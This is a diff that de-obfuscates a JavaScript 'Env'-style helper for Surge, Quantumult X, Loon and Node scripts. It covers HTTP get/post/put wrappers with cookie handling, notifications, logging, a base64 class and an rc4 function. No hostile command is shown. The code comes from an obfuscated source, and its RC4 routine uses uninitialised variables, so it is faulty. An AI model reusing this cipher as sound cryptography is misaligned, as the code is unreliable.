+      t && (t["headers"] = t["headers"] ? t["headers"] : {}, void 0 === t["headers"]["Cookie"] && void 0 === t["cookieJar"] && (t['cookieJar'] = this['ckjar']));
     }
 
-    ["get"](_0x219a8b, _0x2ad7b8 = () => {}) {
-      const _0x1848cc = {
-        "X-Surge-Skip-Scripting": false
+    ["get"](t, p = () => {}) {
+      const X = {
+        'X-Surge-Skip-Scripting': false
+      },
+            L = {
+        'hints': false
       };
-      const _0x24a0c1 = {
-        "hints": false
-      };
-      _0x219a8b["headers"] && (delete _0x219a8b["headers"]["Content-Type"], delete _0x219a8b["headers"]["Content-Length"]);
-      this["isSurge"]() || this["isLoon"]() ? (this["isSurge"]() && this["isNeedRewrite"] && (_0x219a8b["headers"] = _0x219a8b["headers"] || {}, Object["assign"](_0x219a8b["headers"], _0x1848cc)), $httpClient["get"](_0x219a8b, (_0x20d842, _0x59d1ed, _0x2658be) => {
-        !_0x20d842 && _0x59d1ed && (_0x59d1ed["body"] = _0x2658be, _0x59d1ed["statusCode"] = _0x59d1ed["status"]);
-
-        _0x2ad7b8(_0x20d842, _0x59d1ed, _0x2658be);
-      })) : this["isQuanX"]() ? (this["isNeedRewrite"] && (_0x219a8b["opts"] = _0x219a8b["opts"] || {}, Object["assign"](_0x219a8b["opts"], _0x24a0c1)), $task["fetch"](_0x219a8b)["then"](_0x37c6a8 => {
+      t["headers"] && (delete t["headers"]['Content-Type'], delete t["headers"]["Content-Length"]);
+      this["isSurge"]() || this['isLoon']() ? (this['isSurge']() && this['isNeedRewrite'] && (t["headers"] = t['headers'] || {}, Object["assign"](t["headers"], X)), $httpClient["get"](t, (n, z, A) => {
+        !n && z && (z["body"] = A, z["statusCode"] = z['status']);
+        p(n, z, A);
+      })) : this['isQuanX']() ? (this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t["opts"], L)), $task["fetch"](t)["then"](n => {
         const {
-          "statusCode": _0xf0e34,
-          "statusCode": _0x2f15eb,
-          "headers": _0x594dfb,
-          "body": _0x59050b
-        } = _0x37c6a8,
-              _0x3846f2 = {
-          'status': _0xf0e34,
-          'statusCode': _0x2f15eb,
-          'headers': _0x594dfb,
-          'body': _0x59050b
+          'statusCode': z,
+          'statusCode': A,
+          'headers': l,
+          'body': k
+        } = n,
+              d = {
+          'status': z,
+          'statusCode': A,
+          'headers': l,
+          'body': k
         };
-
-        _0x2ad7b8(null, _0x3846f2, _0x59050b);
-      }, _0x37766b => _0x2ad7b8(_0x37766b))) : this["isNode"]() && (this["initGotEnv"](_0x219a8b), this["got"](_0x219a8b)['on']("redirect", (_0x2682d4, _0x347bef) => {
+        p(null, d, k);
+      }, n => p(n))) : this['isNode']() && (this["initGotEnv"](t), this["got"](t)['on']("redirect", (n, z) => {
         try {
-          if (_0x2682d4["headers"]["set-cookie"]) {
-            const _0xdf06b8 = _0x2682d4["headers"]["set-cookie"]["map"](this["cktough"]["Cookie"]["parse"])["toString"]();
-
-            this["ckjar"]["setCookieSync"](_0xdf06b8, null);
-            _0x347bef["cookieJar"] = this["ckjar"];
+          if (n["headers"]["set-cookie"]) {
+            const A = n["headers"]['set-cookie']["map"](this["cktough"]['Cookie']["parse"])["toString"]();
+            this['ckjar']['setCookieSync'](A, null);
+            z["cookieJar"] = this['ckjar'];
           }
-        } catch (_0x45563c) {
-          this["logErr"](_0x45563c);
+        } catch (l) {
+          this["logErr"](l);
         }
-      })["then"](_0x4a25a3 => {
+      })["then"](n => {
         const {
-          "statusCode": _0x528287,
-          "statusCode": _0x5b7294,
-          "headers": _0x489fc4,
-          "body": _0x2a55f3
-        } = _0x4a25a3,
-              _0x23ee31 = {
-          'status': _0x528287,
-          'statusCode': _0x5b7294,
-          'headers': _0x489fc4,
-          'body': _0x2a55f3
+          'statusCode': z,
+          'statusCode': A,
+          'headers': l,
+          'body': k
+        } = n,
+              d = {
+          'status': z,
+          'statusCode': A,
+          'headers': l,
+          'body': k
         };
-
-        _0x2ad7b8(null, _0x23ee31, _0x2a55f3);
-      }, _0x5f4535 => {
+        p(null, d, k);
+      }, n => {
         const {
-          "message": _0x4e3dfd,
-          "response": _0x19d175
-        } = _0x5f4535;
-
-        _0x2ad7b8(_0x4e3dfd, _0x19d175, _0x19d175 && _0x19d175["body"]);
+          'message': z,
+          'response': A
+        } = n;
+        p(z, A, A && A["body"]);
       }));
     }
 
-    ["post"](_0x25f564, _0x57034b = () => {}) {
-      const _0x53b574 = {
-        "X-Surge-Skip-Scripting": false
-      };
-      const _0x1b85c9 = {
-        "hints": false
+    ["post"](t, p = () => {}) {
+      const X = {
+        'X-Surge-Skip-Scripting': false
+      },
+            L = {
+        'hints': false
       };
 
-      if (_0x25f564["body"] && _0x25f564["headers"] && !_0x25f564["headers"]["Content-Type"] && (_0x25f564["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), _0x25f564["headers"] && delete _0x25f564["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
-        this["isSurge"]() && this["isNeedRewrite"] && (_0x25f564["headers"] = _0x25f564["headers"] || {}, Object["assign"](_0x25f564["headers"], _0x53b574));
-        $httpClient["post"](_0x25f564, (_0x44f8e4, _0x39a42e, _0x2a22a8) => {
-          !_0x44f8e4 && _0x39a42e && (_0x39a42e["body"] = _0x2a22a8, _0x39a42e["statusCode"] = _0x39a42e["status"]);
-
-          _0x57034b(_0x44f8e4, _0x39a42e, _0x2a22a8);
+      if (t["body"] && t["headers"] && !t["headers"]["Content-Type"] && (t["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), t["headers"] && delete t["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
+        this["isSurge"]() && this["isNeedRewrite"] && (t['headers'] = t["headers"] || {}, Object["assign"](t["headers"], X));
+        $httpClient["post"](t, (n, z, A) => {
+          !n && z && (z["body"] = A, z["statusCode"] = z["status"]);
+          p(n, z, A);
         });
       } else {
-        if (this["isQuanX"]()) {
-          _0x25f564["method"] = "POST";
-          this["isNeedRewrite"] && (_0x25f564["opts"] = _0x25f564["opts"] || {}, Object["assign"](_0x25f564["opts"], _0x1b85c9));
-          $task["fetch"](_0x25f564)["then"](_0x1d7dcb => {
+        if (this['isQuanX']()) {
+          t['method'] = "POST";
+          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t['opts'], L));
+          $task["fetch"](t)["then"](n => {
             const {
-              "statusCode": _0x370dc5,
-              "statusCode": _0x317abc,
-              "headers": _0x285bab,
-              "body": _0x2be6b5
-            } = _0x1d7dcb,
-                  _0x42016d = {
-              'status': _0x370dc5,
-              'statusCode': _0x317abc,
-              'headers': _0x285bab,
-              'body': _0x2be6b5
+              'statusCode': z,
+              'statusCode': A,
+              'headers': l,
+              'body': k
+            } = n,
+                  d = {
+              'status': z,
+              'statusCode': A,
+              'headers': l,
+              'body': k
             };
-
-            _0x57034b(null, _0x42016d, _0x2be6b5);
-          }, _0x41e1d6 => _0x57034b(_0x41e1d6));
+            p(null, d, k);
+          }, n => p(n));
         } else {
-          if (this["isNode"]()) {
-            this["initGotEnv"](_0x25f564);
+          if (this['isNode']()) {
+            this["initGotEnv"](t);
             const {
-              "url": _0x5b22b0,
-              ..._0x2d56e8
-            } = _0x25f564;
-            this["got"]["post"](_0x5b22b0, _0x2d56e8)["then"](_0x1e9aaf => {
+              'url': n,
+              ...z
+            } = t;
+            this["got"]["post"](n, z)["then"](A => {
               const {
-                "statusCode": _0x520f55,
-                "statusCode": _0x31f392,
-                "headers": _0xbbb1bd,
-                "body": _0x7d5e52
-              } = _0x1e9aaf,
-                    _0x2504b2 = {
-                'status': _0x520f55,
-                'statusCode': _0x31f392,
-                'headers': _0xbbb1bd,
-                'body': _0x7d5e52
+                'statusCode': l,
+                'statusCode': k,
+                'headers': d,
+                'body': T
+              } = A,
+                    U = {
+                'status': l,
+                'statusCode': k,
+                'headers': d,
+                'body': T
               };
-
-              _0x57034b(null, _0x2504b2, _0x7d5e52);
-            }, _0xde488c => {
+              p(null, U, T);
+            }, A => {
               const {
-                "message": _0x1ba103,
-                "response": _0x111634
-              } = _0xde488c;
-
-              _0x57034b(_0x1ba103, _0x111634, _0x111634 && _0x111634["body"]);
+                'message': l,
+                'response': k
+              } = A;
+              p(l, k, k && k["body"]);
             });
           }
         }
       }
     }
 
-    ["put"](_0x3a6500, _0x58db01 = () => {}) {
-      const _0x257e0d = {
-        "X-Surge-Skip-Scripting": false
-      };
-      const _0x1be9c9 = {
-        "hints": false
+    ["put"](t, p = () => {}) {
+      const X = {
+        'X-Surge-Skip-Scripting': false
+      },
+            L = {
+        'hints': false
       };
 
-      if (_0x3a6500["body"] && _0x3a6500["headers"] && !_0x3a6500["headers"]["Content-Type"] && (_0x3a6500["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), _0x3a6500["headers"] && delete _0x3a6500["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
-        this["isSurge"]() && this["isNeedRewrite"] && (_0x3a6500["headers"] = _0x3a6500["headers"] || {}, Object["assign"](_0x3a6500["headers"], _0x257e0d)), $httpClient["put"](_0x3a6500, (_0x5dc443, _0xc21d46, _0x5db61a) => {
-          !_0x5dc443 && _0xc21d46 && (_0xc21d46["body"] = _0x5db61a, _0xc21d46["statusCode"] = _0xc21d46["status"]), _0x58db01(_0x5dc443, _0xc21d46, _0x5db61a);
+      if (t["body"] && t['headers'] && !t["headers"]["Content-Type"] && (t['headers']['Content-Type'] = 'application/x-www-form-urlencoded'), t["headers"] && delete t["headers"]["Content-Length"], this["isSurge"]() || this['isLoon']()) {
+        this['isSurge']() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object['assign'](t['headers'], X));
+        $httpClient['put'](t, (n, z, A) => {
+          !n && z && (z['body'] = A, z["statusCode"] = z["status"]);
+          p(n, z, A);
         });
       } else {
         if (this["isQuanX"]()) {
-          _0x3a6500["method"] = "PUT";
-          this["isNeedRewrite"] && (_0x3a6500["opts"] = _0x3a6500["opts"] || {}, Object["assign"](_0x3a6500["opts"], _0x1be9c9));
-          $task["fetch"](_0x3a6500)["then"](_0x2bd449 => {
+          t["method"] = "PUT";
+          this['isNeedRewrite'] && (t['opts'] = t["opts"] || {}, Object['assign'](t['opts'], L));
+          $task["fetch"](t)['then'](n => {
             const {
-              "statusCode": _0x4ee915,
-              "statusCode": _0x15c36d,
-              "headers": _0x477aee,
-              "body": _0xd385af
-            } = _0x2bd449,
-                  _0x2e775f = {
-              'status': _0x4ee915,
-              'statusCode': _0x15c36d,
-              'headers': _0x477aee,
-              'body': _0xd385af
+              'statusCode': z,
+              'statusCode': A,
+              'headers': l,
+              'body': k
+            } = n,
+                  d = {
+              'status': z,
+              'statusCode': A,
+              'headers': l,
+              'body': k
             };
-
-            _0x58db01(null, _0x2e775f, _0xd385af);
-          }, _0x2ab5f3 => _0x58db01(_0x2ab5f3));
+            p(null, d, k);
+          }, n => p(n));
         } else {
-          if (this["isNode"]()) {
-            this["initGotEnv"](_0x3a6500);
+          if (this['isNode']()) {
+            this["initGotEnv"](t);
             const {
-              "url": _0x4a6a10,
-              ..._0x433416
-            } = _0x3a6500;
-            this["got"]["put"](_0x4a6a10, _0x433416)["then"](_0xbd3f37 => {
+              'url': n,
+              ...z
+            } = t;
+            this["got"]['put'](n, z)["then"](A => {
               const {
-                "statusCode": _0x4c7d66,
-                "statusCode": _0xefcce0,
-                "headers": _0x467897,
-                "body": _0xdcdff4
-              } = _0xbd3f37,
-                    _0x1d9c13 = {
-                'status': _0x4c7d66,
-                'statusCode': _0xefcce0,
-                'headers': _0x467897,
-                'body': _0xdcdff4
+                'statusCode': l,
+                'statusCode': k,
+                'headers': d,
+                'body': T
+              } = A,
+                    U = {
+                'status': l,
+                'statusCode': k,
+                'headers': d,
+                'body': T
               };
-
-              _0x58db01(null, _0x1d9c13, _0xdcdff4);
-            }, _0xc3dad7 => {
+              p(null, U, T);
+            }, A => {
               const {
-                "message": _0x1fa123,
-                "response": _0x5a6ad5
-              } = _0xc3dad7;
-
-              _0x58db01(_0x1fa123, _0x5a6ad5, _0x5a6ad5 && _0x5a6ad5["body"]);
+                'message': l,
+                'response': k
+              } = A;
+              p(l, k, k && k["body"]);
             });
           }
         }
       }
     }
 
-    ["time"](_0x510bc2) {
-      let _0xbe6c9c = {
-        'M+': new Date()["getMonth"]() + 1,
+    ['time'](t) {
+      let p = {
+        'M+': new Date()['getMonth']() + 1,
         'd+': new Date()["getDate"](),
-        'H+': new Date()["getHours"](),
+        'H+': new Date()['getHours'](),
         'm+': new Date()["getMinutes"](),
         's+': new Date()["getSeconds"](),
         'q+': Math["floor"]((new Date()["getMonth"]() + 3) / 3),
         'S': new Date()["getMilliseconds"]()
       };
-      /(y+)/["test"](_0x510bc2) && (_0x510bc2 = _0x510bc2["replace"](RegExp['$1'], (new Date()["getFullYear"]() + '')["substr"](4 - RegExp['$1']["length"])));
+      /(y+)/["test"](t) && (t = t["replace"](RegExp['$1'], (new Date()["getFullYear"]() + '')["substr"](4 - RegExp['$1']["length"])));
 
-      for (let _0x1f4ced in _0xbe6c9c) new RegExp('(' + _0x1f4ced + ')')["test"](_0x510bc2) && (_0x510bc2 = _0x510bc2["replace"](RegExp['$1'], 1 == RegExp['$1']["length"] ? _0xbe6c9c[_0x1f4ced] : ('00' + _0xbe6c9c[_0x1f4ced])["substr"](('' + _0xbe6c9c[_0x1f4ced])["length"])));
+      for (let X in p) new RegExp('(' + X + ')')["test"](t) && (t = t["replace"](RegExp['$1'], 1 == RegExp['$1']["length"] ? p[X] : ('00' + p[X])["substr"](('' + p[X])['length'])));
 
-      return _0x510bc2;
+      return t;
     }
 
-    ["msg"](_0x21e0fd = _0x1175a5, _0x3f4b9c = '', _0x2e1645 = '', _0x323e85) {
-      const _0x23ad5c = _0x2f29c0 => {
-        if (!_0x2f29c0) {
-          return _0x2f29c0;
+    ["msg"](t = D, p = '', X = '', L) {
+      const n = A => {
+        if (!A) {
+          return A;
         }
 
-        if ("string" == typeof _0x2f29c0) {
-          return this["isLoon"]() ? _0x2f29c0 : this["isQuanX"]() ? {
-            'open-url': _0x2f29c0
+        if ('string' == typeof A) {
+          return this['isLoon']() ? A : this["isQuanX"]() ? {
+            'open-url': A
           } : this["isSurge"]() ? {
-            'url': _0x2f29c0
+            'url': A
           } : void 0;
         }
 
-        if ("object" == typeof _0x2f29c0) {
+        if ('object' == typeof A) {
           if (this["isLoon"]()) {
-            let _0x5b2213 = _0x2f29c0["openUrl"] || _0x2f29c0["url"] || _0x2f29c0["open-url"],
-                _0x1be851 = _0x2f29c0["mediaUrl"] || _0x2f29c0["media-url"];
-
-            const _0x41043 = {
-              "openUrl": _0x5b2213,
-              "mediaUrl": _0x1be851
+            let l = A['openUrl'] || A['url'] || A["open-url"],
+                k = A["mediaUrl"] || A['media-url'];
+            const d = {
+              'openUrl': l,
+              'mediaUrl': k
             };
-            return _0x41043;
+            return d;
           }
 
           if (this["isQuanX"]()) {
-            let _0x328f7a = _0x2f29c0["open-url"] || _0x2f29c0["url"] || _0x2f29c0["openUrl"],
-                _0x5ce2ba = _0x2f29c0["media-url"] || _0x2f29c0["mediaUrl"];
-
-            const _0x203e7b = {
-              "open-url": _0x328f7a,
-              "media-url": _0x5ce2ba
+            let T = A["open-url"] || A["url"] || A['openUrl'],
+                U = A['media-url'] || A["mediaUrl"];
+            const r = {
+              'open-url': T,
+              'media-url': U
             };
-            return _0x203e7b;
+            return r;
           }
 
-          if (this["isSurge"]()) {
-            let _0x1adb19 = _0x2f29c0["url"] || _0x2f29c0["openUrl"] || _0x2f29c0["open-url"];
-
-            const _0x189c1e = {
-              "url": _0x1adb19
+          if (this['isSurge']()) {
+            let u = A["url"] || A["openUrl"] || A["open-url"];
+            const m = {
+              'url': u
             };
-            return _0x189c1e;
+            return m;
           }
         }
       };
 
-      this["isMute"] || (this["isSurge"]() || this["isLoon"]() ? $notification["post"](_0x21e0fd, _0x3f4b9c, _0x2e1645, _0x23ad5c(_0x323e85)) : this["isQuanX"]() && $notify(_0x21e0fd, _0x3f4b9c, _0x2e1645, _0x23ad5c(_0x323e85)));
-      let _0x55c319 = ['', "==============📣系统通知📣=============="];
-
-      _0x55c319["push"](_0x21e0fd);
-
-      _0x3f4b9c && _0x55c319["push"](_0x3f4b9c);
-      _0x2e1645 && _0x55c319["push"](_0x2e1645);
-      console["log"](_0x55c319["join"]("\n"));
-      this["logs"] = this["logs"]["concat"](_0x55c319);
+      this["isMute"] || (this["isSurge"]() || this["isLoon"]() ? $notification['post'](t, p, X, n(L)) : this["isQuanX"]() && $notify(t, p, X, n(L)));
+      let z = ['', "==============📣系统通知📣=============="];
+      z['push'](t);
+      p && z["push"](p);
+      X && z["push"](X);
+      console["log"](z["join"]("\n"));
+      this["logs"] = this['logs']["concat"](z);
     }
 
-    ["log"](..._0x26f1fd) {
-      _0x26f1fd["length"] > 0 && (this["logs"] = [...this["logs"], ..._0x26f1fd]);
-      console["log"](_0x26f1fd["join"](this["logSeparator"]));
+    ["log"](...t) {
+      t['length'] > 0 && (this["logs"] = [...this["logs"], ...t]);
+      console['log'](t["join"](this["logSeparator"]));
     }
 
-    ["logErr"](_0x3f0f6a, _0x23f236) {
-      const _0x2e17e7 = !this["isSurge"]() && !this["isQuanX"]() && !this["isLoon"]();
-
-      _0x2e17e7 ? this["log"]('', '❗️' + this["name"] + ", 错误!", _0x3f0f6a["stack"]) : this["log"]('', '❗️' + this["name"] + ", 错误!", _0x3f0f6a);
+    ["logErr"](t, p) {
+      const X = !this["isSurge"]() && !this["isQuanX"]() && !this["isLoon"]();
+      X ? this['log']('', '❗️' + this["name"] + ", 错误!", t["stack"]) : this['log']('', '❗️' + this['name'] + ", 错误!", t);
     }
 
-    ["wait"](_0x5206f3) {
-      return new Promise(_0x3991af => setTimeout(_0x3991af, _0x5206f3));
+    ['wait'](t) {
+      return new Promise(p => setTimeout(p, t));
     }
 
-    ["done"](_0x239b89 = {}) {
-      const _0x38337e = new Date()["getTime"](),
-            _0x225057 = (_0x38337e - this["startTime"]) / 1000;
-
-      this["log"]('', '🔔' + this["name"] + ", 结束! 🕛 " + _0x225057 + " 秒");
+    ["done"](t = {}) {
+      const p = new Date()["getTime"](),
+            X = (p - this['startTime']) / 1000;
+      this["log"]('', '🔔' + this['name'] + ", 结束! 🕛 " + X + " 秒");
       this["log"]();
-      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(_0x239b89);
+      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(t);
     }
 
-  }(_0x1175a5, _0x4f6465);
+  }(D, j);
 }
 
 function FxPCnMKLw7() {
   _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
 
-  this["encode"] = function (_0x3b7af2) {
-    var _0x39685a = '';
+  this["encode"] = function (D) {
+    var j = '',
+        N,
+        t,
+        p,
+        X,
+        L,
+        n,
+        z,
+        A = 0;
+    D = _utf8_encode(D);
 
-    var _0x998028, _0x738a27, _0x3a61c4, _0x2e8cda, _0x429dff, _0x2670fb, _0x2a9440;
-
-    var _0x45a292 = 0;
-    _0x3b7af2 = _utf8_encode(_0x3b7af2);
-
-    while (_0x45a292 < _0x3b7af2["length"]) {
-      _0x998028 = _0x3b7af2["charCodeAt"](_0x45a292++);
-      _0x738a27 = _0x3b7af2["charCodeAt"](_0x45a292++);
-      _0x3a61c4 = _0x3b7af2["charCodeAt"](_0x45a292++);
-      _0x2e8cda = _0x998028 >> 2;
-      _0x429dff = (_0x998028 & 3) << 4 | _0x738a27 >> 4;
-      _0x2670fb = (_0x738a27 & 15) << 2 | _0x3a61c4 >> 6;
-      _0x2a9440 = _0x3a61c4 & 63;
-
-      if (isNaN(_0x738a27)) {
-        _0x2670fb = _0x2a9440 = 64;
-      } else {
-        isNaN(_0x3a61c4) && (_0x2a9440 = 64);
-      }
-
-      _0x39685a = _0x39685a + _keyStr["charAt"](_0x2e8cda) + _keyStr["charAt"](_0x429dff) + _keyStr["charAt"](_0x2670fb) + _keyStr["charAt"](_0x2a9440);
+    while (A < D["length"]) {
+      N = D["charCodeAt"](A++);
+      t = D["charCodeAt"](A++);
+      p = D["charCodeAt"](A++);
+      X = N >> 2;
+      L = (N & 3) << 4 | t >> 4;
+      n = (t & 15) << 2 | p >> 6;
+      z = p & 63;
+      isNaN(t) ? n = z = 64 : isNaN(p) && (z = 64);
+      j = j + _keyStr["charAt"](X) + _keyStr["charAt"](L) + _keyStr['charAt'](n) + _keyStr["charAt"](z);
     }
 
-    return _0x39685a;
+    return j;
   };
 
-  this["decode"] = function (_0x196fbd) {
-    var _0x1ff533 = '';
+  this["decode"] = function (D) {
+    var j = '',
+        N,
+        t,
+        p,
+        X,
+        L,
+        n,
+        z,
+        A = 0;
+    D = D["replace"](/[^A-Za-z0-9\+\/\=]/g, '');
 
-    var _0x9b13a6, _0x2881da, _0x3cafe6;
-
-    var _0x189e01, _0x1bea87, _0x2f926a, _0x2ae425;
-
-    var _0x3dd94e = 0;
-    _0x196fbd = _0x196fbd["replace"](/[^A-Za-z0-9\+\/\=]/g, '');
-
-    while (_0x3dd94e < _0x196fbd["length"]) {
-      _0x189e01 = _keyStr["indexOf"](_0x196fbd["charAt"](_0x3dd94e++));
-      _0x1bea87 = _keyStr["indexOf"](_0x196fbd["charAt"](_0x3dd94e++));
-      _0x2f926a = _keyStr["indexOf"](_0x196fbd["charAt"](_0x3dd94e++));
-      _0x2ae425 = _keyStr["indexOf"](_0x196fbd["charAt"](_0x3dd94e++));
-      _0x9b13a6 = _0x189e01 << 2 | _0x1bea87 >> 4;
-      _0x2881da = (_0x1bea87 & 15) << 4 | _0x2f926a >> 2;
-      _0x3cafe6 = (_0x2f926a & 3) << 6 | _0x2ae425;
-      _0x1ff533 = _0x1ff533 + String["fromCharCode"](_0x9b13a6);
-      _0x2f926a != 64 && (_0x1ff533 = _0x1ff533 + String["fromCharCode"](_0x2881da));
-      _0x2ae425 != 64 && (_0x1ff533 = _0x1ff533 + String["fromCharCode"](_0x3cafe6));
+    while (A < D["length"]) {
+      X = _keyStr["indexOf"](D["charAt"](A++));
+      L = _keyStr["indexOf"](D["charAt"](A++));
+      n = _keyStr["indexOf"](D["charAt"](A++));
+      z = _keyStr['indexOf'](D["charAt"](A++));
+      N = X << 2 | L >> 4;
+      t = (L & 15) << 4 | n >> 2;
+      p = (n & 3) << 6 | z;
+      j = j + String["fromCharCode"](N);
+      n != 64 && (j = j + String["fromCharCode"](t));
+      z != 64 && (j = j + String['fromCharCode'](p));
     }
 
-    _0x1ff533 = _utf8_decode(_0x1ff533);
-    return _0x1ff533;
+    j = _utf8_decode(j);
+    return j;
   };
 
-  _utf8_encode = function (_0x1442fa) {
-    _0x1442fa = _0x1442fa["replace"](/\r\n/g, "\n");
-    var _0x43e64d = '';
+  _utf8_encode = function (D) {
+    D = D["replace"](/\r\n/g, "\n");
+    var j = '';
 
-    for (var _0x234039 = 0; _0x234039 < _0x1442fa["length"]; _0x234039++) {
-      var _0x529872 = _0x1442fa["charCodeAt"](_0x234039);
-
-      if (_0x529872 < 128) {
-        _0x43e64d += String["fromCharCode"](_0x529872);
-      } else {
-        _0x529872 > 127 && _0x529872 < 2048 ? (_0x43e64d += String["fromCharCode"](_0x529872 >> 6 | 192), _0x43e64d += String["fromCharCode"](_0x529872 & 63 | 128)) : (_0x43e64d += String["fromCharCode"](_0x529872 >> 12 | 224), _0x43e64d += String["fromCharCode"](_0x529872 >> 6 & 63 | 128), _0x43e64d += String["fromCharCode"](_0x529872 & 63 | 128));
-      }
+    for (var N = 0; N < D['length']; N++) {
+      var t = D["charCodeAt"](N);
+      t < 128 ? j += String["fromCharCode"](t) : t > 127 && t < 2048 ? (j += String["fromCharCode"](t >> 6 | 192), j += String["fromCharCode"](t & 63 | 128)) : (j += String["fromCharCode"](t >> 12 | 224), j += String['fromCharCode'](t >> 6 & 63 | 128), j += String["fromCharCode"](t & 63 | 128));
     }
 
-    return _0x43e64d;
+    return j;
   };
 
-  _utf8_decode = function (_0x49f158) {
-    var _0x3a475d = '',
-        _0x5f3836 = 0,
-        _0x23e38a = c1 = c2 = 0;
+  _utf8_decode = function (D) {
+    var j = '',
+        N = 0,
+        t = c1 = c2 = 0;
 
-    while (_0x5f3836 < _0x49f158["length"]) {
-      _0x23e38a = _0x49f158["charCodeAt"](_0x5f3836);
-
-      if (_0x23e38a < 128) {
-        _0x3a475d += String["fromCharCode"](_0x23e38a), _0x5f3836++;
-      } else {
-        _0x23e38a > 191 && _0x23e38a < 224 ? (c2 = _0x49f158["charCodeAt"](_0x5f3836 + 1), _0x3a475d += String["fromCharCode"]((_0x23e38a & 31) << 6 | c2 & 63), _0x5f3836 += 2) : (c2 = _0x49f158["charCodeAt"](_0x5f3836 + 1), c3 = _0x49f158["charCodeAt"](_0x5f3836 + 2), _0x3a475d += String["fromCharCode"]((_0x23e38a & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x5f3836 += 3);
-      }
+    while (N < D["length"]) {
+      t = D["charCodeAt"](N);
+      t < 128 ? (j += String["fromCharCode"](t), N++) : t > 191 && t < 224 ? (c2 = D["charCodeAt"](N + 1), j += String['fromCharCode']((t & 31) << 6 | c2 & 63), N += 2) : (c2 = D["charCodeAt"](N + 1), c3 = D["charCodeAt"](N + 2), j += String["fromCharCode"]((t & 15) << 12 | (c2 & 63) << 6 | c3 & 63), N += 3);
     }
 
-    return _0x3a475d;
+    return j;
   };
 }
 
-function rc4(_0x11f3e0, _0x53068b) {
-  var _0x313075 = Array(256);
+function rc4(D, j) {
+  var N = Array(256),
+      t = Array(D["length"]);
 
-  var _0x23d2ce = Array(_0x11f3e0["length"]);
-
-  for (var _0xadbff6 = 0; _0xadbff6 < 256; _0xadbff6++) {
-    _0x313075[_0xadbff6] = _0xadbff6;
-
-    var _0x5598d2 = (_0x5598d2 + _0x313075[_0xadbff6] + _0x53068b["charCodeAt"](_0xadbff6 % _0x53068b["length"])) % 256,
-        _0x110938 = _0x313075[_0xadbff6];
-
-    _0x313075[_0xadbff6] = _0x313075[_0x5598d2];
-    _0x313075[_0x5598d2] = _0x110938;
+  for (var p = 0; p < 256; p++) {
+    N[p] = p;
+    var X = (X + N[p] + j['charCodeAt'](p % j['length'])) % 256,
+        L = N[p];
+    N[p] = N[X];
+    N[X] = L;
   }
 
-  for (var _0xadbff6 = 0; _0xadbff6 < _0x11f3e0["length"]; _0xadbff6++) {
-    _0x23d2ce[_0xadbff6] = _0x11f3e0["charCodeAt"](_0xadbff6);
+  for (var p = 0; p < D["length"]; p++) {
+    t[p] = D["charCodeAt"](p);
   }
 
-  for (var _0x24ce66 = 0; _0x24ce66 < _0x23d2ce["length"]; _0x24ce66++) {
-    var _0xadbff6 = (_0xadbff6 + 1) % 256,
-        _0x5598d2 = (_0x5598d2 + _0x313075[_0xadbff6]) % 256,
-        _0x110938 = _0x313075[_0xadbff6];
-
-    _0x313075[_0xadbff6] = _0x313075[_0x5598d2];
-    _0x313075[_0x5598d2] = _0x110938;
-
-    var _0x92a59e = (_0x313075[_0xadbff6] + _0x313075[_0x5598d2] % 256) % 256;
-
-    _0x23d2ce[_0x24ce66] = String["fromCharCode"](_0x23d2ce[_0x24ce66] ^ _0x313075[_0x92a59e]);
+  for (var n = 0; n < t["length"]; n++) {
+    var p = (p + 1) % 256,
+        X = (X + N[p]) % 256,
+        L = N[p];
+    N[p] = N[X];
+    N[X] = L;
+    var z = (N[p] + N[X] % 256) % 256;
+    t[n] = String['fromCharCode'](t[n] ^ N[z]);
   }
 
-  return _0x23d2ce["join"]('');
+  return t['join']('');
 }
 
-function Envcc(_0x5dbf42, _0x4bce0e) {
-  class _0x29cfff {
-    constructor(_0x522f73) {
-      this["env"] = _0x522f73;
+function Envcc(D, j) {
+  class N {
+    constructor(t) {
+      this["env"] = t;
     }
 
-    ["send"](_0x10701d, _0x80d1ef = "GET") {
-      _0x10701d = "string" == typeof _0x10701d ? {
-        'url': _0x10701d
-      } : _0x10701d;
-      let _0xb34695 = this["get"];
-      "POST" === _0x80d1ef && (_0xb34695 = this["post"]);
-      return new Promise((_0x4a3e5, _0x237427) => {
-        _0xb34695["call"](this, _0x10701d, (_0xee2d16, _0x14afca, _0x30f944) => {
-          _0xee2d16 ? _0x237427(_0xee2d16) : _0x4a3e5(_0x14afca);
+    ["send"](t, p = "GET") {
+      t = "string" == typeof t ? {
+        'url': t
+      } : t;
+      let X = this["get"];
+      'POST' === p && (X = this["post"]);
+      return new Promise((L, n) => {
+        X["call"](this, t, (z, A, l) => {
+          z ? n(z) : L(A);
         });
       });
     }
 
-    ["get"](_0x43fad9) {
-      return this["send"]["call"](this["env"], _0x43fad9);
+    ['get'](t) {
+      return this["send"]['call'](this['env'], t);
     }
 
-    ["post"](_0x28a121) {
-      return this["send"]["call"](this["env"], _0x28a121, "POST");
+    ['post'](t) {
+      return this["send"]["call"](this["env"], t, "POST");
     }
 
   }
 
   return new class {
-    constructor(_0x67432b, _0x2a113e) {
-      this["name"] = _0x67432b;
-      this["http"] = new _0x29cfff(this);
+    constructor(t, p) {
+      this["name"] = t;
+      this["http"] = new N(this);
       this["data"] = null;
       this["dataFile"] = "box.dat";
       this["logs"] = [];
-      this["isMute"] = false;
+      this['isMute'] = false;
       this["isNeedRewrite"] = false;
       this["logSeparator"] = "\n";
-      this["encoding"] = "utf-8";
-      this["startTime"] = new Date()["getTime"]();
-      Object["assign"](this, _0x2a113e);
+      this["encoding"] = 'utf-8';
+      this['startTime'] = new Date()['getTime']();
+      Object["assign"](this, p);
       this["log"]('', '🔔' + this["name"] + ", 开始!");
     }
 
-    ["isNode"]() {
